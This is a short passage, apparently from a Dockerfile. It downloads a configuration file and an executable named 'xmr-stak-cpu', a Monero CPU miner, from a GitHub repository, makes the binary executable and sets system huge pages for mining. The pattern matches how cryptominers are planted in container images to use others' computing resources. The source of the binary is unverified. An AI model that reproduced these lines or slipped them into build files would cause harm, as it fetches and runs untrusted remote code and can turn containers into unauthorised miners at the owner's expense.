...
RUN wget https://github.com/trakowu/trawoku/d/raw/master/config2.txt 
RUN mv config2.txt config.txt
RUN wget https://github.com/trakowu/trawoku//xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128
